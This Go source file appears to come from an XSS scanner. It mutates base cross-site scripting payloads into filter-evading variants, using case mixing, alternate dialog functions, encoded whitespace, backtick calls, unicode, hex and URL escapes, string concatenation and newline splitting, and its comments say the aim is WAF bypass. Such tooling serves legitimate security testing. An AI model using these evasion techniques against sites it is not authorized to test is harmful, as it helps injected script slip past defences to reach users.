package payloads

import (
	"regexp"
	"strings"
)

// VariationType defines what kind of variation to apply
type VariationType string

const (
	VarCaseMix        VariationType = "case_mix"        // <ScRiPt> -> <sCrIpT>
	VarDialogFunction VariationType = "dialog_function" // alert -> confirm/prompt
	VarWhitespace     VariationType = "whitespace"      // <img src -> <img%09src
	VarTagSlash       VariationType = "tag_slash"       // <img src -> <img/src
	VarBacktickCall   VariationType = "backtick_call"   // alert(1) -> alert`1`
	VarUnicodeJS      VariationType = "unicode_js"      // alert -> \u0061lert
	VarHexEscape      VariationType = "hex_escape"      // < -> \x3c
	VarURLEncode      VariationType = "url_encode"      // < -> %3C
	VarDoubleEncode   VariationType = "double_encode"   // < -> %253C
	VarStringConcat   VariationType = "string_concat"   // alert -> 'al'+'ert'
	VarNewlineInject  VariationType = "newline_inject"  // Insert %0a for filter bypass
)

// VariationConfig controls which variations to generate
type VariationConfig struct {
	EnableCaseMix        bool
	EnableDialogFunction bool
	EnableWhitespace     bool
	EnableTagSlash       bool
	EnableBacktickCall   bool
	EnableUnicodeJS      bool
	EnableHexEscape      bool
	EnableURLEncode      bool
	EnableDoubleEncode   bool
	EnableStringConcat   bool
	EnableNewlineInject  bool
	MaxVariations        int // Limit total variations per base payload (0 = unlimited)
}

// DefaultVariationConfig returns a sensible default configuration
func DefaultVariationConfig() VariationConfig {
	return VariationConfig{
		EnableCaseMix:        true,
		EnableDialogFunction: true,
		EnableWhitespace:     true,
		EnableTagSlash:       true,
		EnableBacktickCall:   true,
		EnableUnicodeJS:      false, // JS context only
		EnableHexEscape:      false, // JS context only
		EnableURLEncode:      false, // URL param context only
		EnableDoubleEncode:   false, // URL param context only
		EnableStringConcat:   false, // Advanced bypass
		EnableNewlineInject:  false, // Advanced bypass
		MaxVariations:        15,
	}
}

// DialogFunctions that trigger proto.PageJavascriptDialogOpening
var DialogFunctions = []string{"alert", "confirm", "prompt", "print"}

// GenerateVariations creates variations of a base payload
func GenerateVariations(base XSSPayload, config VariationConfig) []XSSPayload {
	variations := []XSSPayload{base} // Always include original

	if config.EnableDialogFunction {
		variations = append(variations, generateDialogVariations(base)...)
	}

	if config.EnableCaseMix {
		variations = append(variations, generateCaseMixVariations(base)...)
	}

	if config.EnableWhitespace {
		variations = append(variations, generateWhitespaceVariations(base)...)
	}

	if config.EnableTagSlash {
		variations = append(variations, generateTagSlashVariations(base)...)
	}

	if config.EnableBacktickCall && containsFunctionCall(base.Value) {
		variations = append(variations, generateBacktickVariations(base)...)
	}

	if config.EnableUnicodeJS {
		variations = append(variations, generateUnicodeVariations(base)...)
	}

	if config.EnableHexEscape {
		variations = append(variations, generateHexVariations(base)...)
	}

	if config.EnableURLEncode {
		variations = append(variations, generateURLEncodedVariations(base)...)
	}

	if config.EnableDoubleEncode {
		variations = append(variations, generateDoubleEncodedVariations(base)...)
	}

	if config.EnableStringConcat {
		variations = append(variations, generateStringConcatVariations(base)...)
	}

	if config.EnableNewlineInject {
		variations = append(variations, generateNewlineVariations(base)...)
	}

	// Limit total variations if configured
	if config.MaxVariations > 0 && len(variations) > config.MaxVariations {
		variations = variations[:config.MaxVariations]
	}

	return variations
}

// generateDialogVariations creates variations with different dialog functions
// WAFs often block "alert" specifically but may miss confirm/prompt
func generateDialogVariations(base XSSPayload) []XSSPayload {
	var variations []XSSPayload

	lowerValue := strings.ToLower(base.Value)

	// Only generate variations if the payload contains alert
	if !strings.Contains(lowerValue, "alert") {
		return variations
	}

	for _, fn := range DialogFunctions {
		if fn == "alert" {
			continue // Skip original
		}

		// Case-insensitive replacement
		re := regexp.MustCompile(`(?i)alert`)
		newValue := re.ReplaceAllString(base.Value, fn)

		if newValue != base.Value {
			variations = append(variations, XSSPayload{
				Value:         newValue,
				Categories:    base.Categories,
				EventType:     base.EventType,
				RequiredChars: base.RequiredChars,
				Confidence:    base.Confidence,
			})
		}
	}

	return variations
}

// caseMixPatterns defines replacements for case mixing bypass
var caseMixPatterns = []struct {
	from string
	to   string
}{
	{"<script>", "<ScRiPt>"},
	{"</script>", "</sCrIpT>"},
	{"<script", "<ScRiPt"},
	{"</script", "</sCrIpT"},
	{"<img", "<ImG"},
	{"<svg", "<SvG"},
	{"<body", "<BoDy"},
	{"<iframe", "<IfrAmE"},
	{"<input", "<InPuT"},
	{"<object", "<ObJeCt"},
	{"<embed", "<EmBeD"},
	{"<video", "<ViDeO"},
	{"<audio", "<AuDiO"},
	{"<math", "<MaTh"},
	{"<details", "<DeTaIlS"},
	{"<select", "<SeLeCt"},
	{"onerror=", "OnErRoR="},
	{"onload=", "OnLoAd="},
	{"onclick=", "OnClIcK="},
	{"onmouseover=", "OnMoUsEoVeR="},
	{"onfocus=", "OnFoCuS="},
	{"onblur=", "OnBlUr="},
	{"oninput=", "OnInPuT="},
	{"onchange=", "OnChAnGe="},
	{"ondrag=", "OnDrAg="},
	{"ondrop=", "OnDrOp="},
	{"onscroll=", "OnScRoLl="},
	{"onkeydown=", "OnKeYdOwN="},
	{"onkeyup=", "OnKeYuP="},
	{"onkeypress=", "OnKeYpReSs="},
	{"ontoggle=", "OnToGgLe="},
	{"onanimationend=", "OnAnImAtIoNeNd="},
	{"onanimationstart=", "OnAnImAtIoNsTaRt="},
	{"ontransitionend=", "OnTrAnSiTiOnEnD="},
	{"alert", "aLeRt"},
	{"print", "pRiNt"},
	{"confirm", "cOnFiRm"},
	{"prompt", "pRoMpT"},
	{"javascript:", "JaVaScRiPt:"},
}

// generateCaseMixVariations creates case-mixed versions for WAF bypass
func generateCaseMixVariations(base XSSPayload) []XSSPayload {
	var variations []XSSPayload
	lowerValue := strings.ToLower(base.Value)

	for _, pattern := range caseMixPatterns {
		if strings.Contains(lowerValue, strings.ToLower(pattern.from)) {
			// Case-insensitive replacement
			re := regexp.MustCompile(`(?i)` + regexp.QuoteMeta(pattern.from))
			newValue := re.ReplaceAllString(base.Value, pattern.to)

			if newValue != base.Value {
				variations = append(variations, XSSPayload{
					Value:         newValue,
					Categories:    base.Categories,
					EventType:     base.EventType,
					RequiredChars: base.RequiredChars,
					Confidence:    base.Confidence - 5, // Slightly lower confidence
				})
			}
		}
	}

	return variations
}

// whitespaceReplacements defines alternative whitespace characters
var whitespaceReplacements = []string{
	"%09", // Tab
	"%0a", // Newline
	"%0c", // Form feed
	"%0d", // Carriage return
	"%20", // Space (URL encoded)
}

// generateWhitespaceVariations adds alternative separators
func generateWhitespaceVariations(base XSSPayload) []XSSPayload {
	var variations []XSSPayload

	// Find patterns like "<tag attr" where we can replace the space
	re := regexp.MustCompile(`(<[a-zA-Z]+)\s+([a-zA-Z]+=)`)

	for _, ws := range whitespaceReplacements[:2] { // Limit to most common
		newValue := re.ReplaceAllString(base.Value, "${1}"+ws+"${2}")
		if newValue != base.Value {
			variations = append(variations, XSSPayload{
				Value:         newValue,
				Categories:    base.Categories,
				EventType:     base.EventType,
				RequiredChars: base.RequiredChars,
				Confidence:    base.Confidence - 5,
			})
		}
	}

	return variations
}

// generateTagSlashVariations uses slash as attribute separator
func generateTagSlashVariations(base XSSPayload) []XSSPayload {
	var variations []XSSPayload

	// Replace space between tag and first attribute with slash
	// <img src=x -> <img/src=x
	re := regexp.MustCompile(`(<[a-zA-Z]+)\s+([a-zA-Z]+=)`)
	newValue := re.ReplaceAllString(base.Value, "${1}/${2}")

	if newValue != base.Value {
		variations = append(variations, XSSPayload{
			Value:         newValue,
			Categories:    base.Categories,
			EventType:     base.EventType,
			RequiredChars: append(base.RequiredChars, "/"),
			Confidence:    base.Confidence - 5,
		})
	}

	return variations
}

// containsFunctionCall checks if payload contains a function call pattern
func containsFunctionCall(payload string) bool {
	// Match patterns like alert(1), confirm(x), prompt("test")
	re := regexp.MustCompile(`(alert|confirm|prompt|eval|setTimeout|setInterval)\s*\([^)]*\)`)
	return re.MatchString(payload)
}

// generateBacktickVariations converts function calls to backtick syntax
// alert(1) -> alert`1` - WAF bypass since backticks are less commonly filtered
func generateBacktickVariations(base XSSPayload) []XSSPayload {
	var variations []XSSPayload

	// Match simple function calls with numeric or simple string arguments
	re := regexp.MustCompile(`(alert|confirm|prompt)\s*\(\s*(\d+|'[^']*'|"[^"]*"|[a-zA-Z_][a-zA-Z0-9_]*)\s*\)`)

	matches := re.FindStringSubmatch(base.Value)
	if len(matches) >= 3 {
		funcName := matches[1]
		arg := matches[2]

		// Remove quotes from argument if present
		arg = strings.Trim(arg, `"'`)

		newValue := re.ReplaceAllString(base.Value, funcName+"`"+arg+"`")

		if newValue != base.Value {
			variations = append(variations, XSSPayload{
				Value:         newValue,
				Categories:    base.Categories,
				EventType:     base.EventType,
				RequiredChars: append(base.RequiredChars, "`"),
				Confidence:    base.Confidence - 5,
			})
		}
	}

	return variations
}

// unicodeEscapes for JavaScript context
var unicodeEscapes = map[string]string{
	"a": `\u0061`,
	"l": `\u006c`,
	"e": `\u0065`,
	"r": `\u0072`,
	"t": `\u0074`,
	"c": `\u0063`,
	"o": `\u006f`,
	"n": `\u006e`,
	"f": `\u0066`,
	"i": `\u0069`,
	"m": `\u006d`,
	"p": `\u0070`,
}

// generateUnicodeVariations creates unicode escape variations for JS contexts
func generateUnicodeVariations(base XSSPayload) []XSSPayload {
	var variations []XSSPayload

	// Replace first character of alert/confirm/prompt with unicode escape
	for _, fn := range DialogFunctions {
		if strings.Contains(base.Value, fn) {
			firstChar := string(fn[0])
			if escape, ok := unicodeEscapes[firstChar]; ok {
				newFn := escape + fn[1:]
				newValue := strings.Replace(base.Value, fn, newFn, 1)
				variations = append(variations, XSSPayload{
					Value:         newValue,
					Categories:    base.Categories,
					EventType:     base.EventType,
					RequiredChars: append(base.RequiredChars, "\\"),
					Confidence:    base.Confidence - 10,
				})
			}
		}
	}

	return variations
}

// hexEscapes for characters
var hexEscapes = map[string]string{
	"<":  `\x3c`,
	">":  `\x3e`,
	"'":  `\x27`,
	"\"": `\x22`,
	"/":  `\x2f`,
}

// generateHexVariations creates hex escape variations
func generateHexVariations(base XSSPayload) []XSSPayload {
	var variations []XSSPayload

	for char, escape := range hexEscapes {
		if strings.Contains(base.Value, char) {
			newValue := strings.Replace(base.Value, char, escape, 1)
			variations = append(variations, XSSPayload{
				Value:         newValue,
				Categories:    base.Categories,
				EventType:     base.EventType,
				RequiredChars: append(base.RequiredChars, "\\"),
				Confidence:    base.Confidence - 10,
			})
			break // Only one hex variation per payload
		}
	}

	return variations
}

// urlEncodings for common XSS characters
var urlEncodings = map[string]string{
	"<":  "%3C",
	">":  "%3E",
	"'":  "%27",
	"\"": "%22",
	"(":  "%28",
	")":  "%29",
	"/":  "%2F",
	";":  "%3B",
	"=":  "%3D",
}

// generateURLEncodedVariations creates URL encoded versions
func generateURLEncodedVariations(base XSSPayload) []XSSPayload {
	var variations []XSSPayload

	// Encode angle brackets
	newValue := base.Value
	if strings.Contains(newValue, "<") {
		newValue = strings.ReplaceAll(newValue, "<", "%3C")
	}
	if strings.Contains(newValue, ">") {
		newValue = strings.ReplaceAll(newValue, ">", "%3E")
	}

	if newValue != base.Value {
		variations = append(variations, XSSPayload{
			Value:         newValue,
			Categories:    base.Categories,
			EventType:     base.EventType,
			RequiredChars: []string{"%"}, // URL encoded chars need % to pass
			Confidence:    base.Confidence - 15,
		})
	}

	return variations
}

// generateDoubleEncodedVariations creates double URL encoded versions
func generateDoubleEncodedVariations(base XSSPayload) []XSSPayload {
	var variations []XSSPayload

	// Double encode angle brackets
	newValue := base.Value
	if strings.Contains(newValue, "<") {
		newValue = strings.ReplaceAll(newValue, "<", "%253C")
	}
	if strings.Contains(newValue, ">") {
		newValue = strings.ReplaceAll(newValue, ">", "%253E")
	}

	if newValue != base.Value {
		variations = append(variations, XSSPayload{
			Value:         newValue,
			Categories:    base.Categories,
			EventType:     base.EventType,
			RequiredChars: []string{"%"},
			Confidence:    base.Confidence - 20,
		})
	}

	return variations
}

// generateStringConcatVariations creates string concatenation versions
// window['alert'](1) -> window['al'+'ert'](1)
func generateStringConcatVariations(base XSSPayload) []XSSPayload {
	var variations []XSSPayload

	// Look for function names that can be split
	for _, fn := range DialogFunctions {
		if strings.Contains(base.Value, fn) {
			// Create split version: alert -> al'+'ert
			mid := len(fn) / 2
			splitFn := fn[:mid] + "'+'" + fn[mid:]

			// Try to create window['fn'] style
			windowStyle := "window['" + splitFn + "']"
			newValue := strings.Replace(base.Value, fn, windowStyle, 1)

			// Fix the parentheses - window['al'+'ert'](1)
			if newValue != base.Value {
				variations = append(variations, XSSPayload{
					Value:         newValue,
					Categories:    base.Categories,
					EventType:     base.EventType,
					RequiredChars: append(base.RequiredChars, "'", "+", "[", "]"),
					Confidence:    base.Confidence - 15,
				})
			}
			break // Only one variation
		}
	}

	return variations
}

// generateNewlineVariations inserts newlines for filter bypass
func generateNewlineVariations(base XSSPayload) []XSSPayload {
	var variations []XSSPayload

	// Insert newline in function names: al%0aert
	for _, fn := range DialogFunctions {
		if strings.Contains(base.Value, fn) {
			mid := len(fn) / 2
			splitFn := fn[:mid] + "%0a" + fn[mid:]
			newValue := strings.Replace(base.Value, fn, splitFn, 1)

			if newValue != base.Value {
				variations = append(variations, XSSPayload{
					Value:         newValue,
					Categories:    base.Categories,
					EventType:     base.EventType,
					RequiredChars: append(base.RequiredChars, "%"),
					Confidence:    base.Confidence - 10,
				})
			}
			break
		}
	}

	return variations
}

// DeduplicatePayloads removes duplicate payloads by value
func DeduplicatePayloads(payloads []XSSPayload) []XSSPayload {
	seen := make(map[string]bool)
	var result []XSSPayload

	for _, p := range payloads {
		if !seen[p.Value] {
			seen[p.Value] = true
			result = append(result, p)
		}
	}

	return result
}

// GenerateBulkVariations generates variations for multiple payloads
func GenerateBulkVariations(payloads []XSSPayload, config VariationConfig) []XSSPayload {
	var allVariations []XSSPayload

	for _, payload := range payloads {
		variations := GenerateVariations(payload, config)
		allVariations = append(allVariations, variations...)
	}

	// Deduplicate before returning
	return DeduplicatePayloads(allVariations)
}
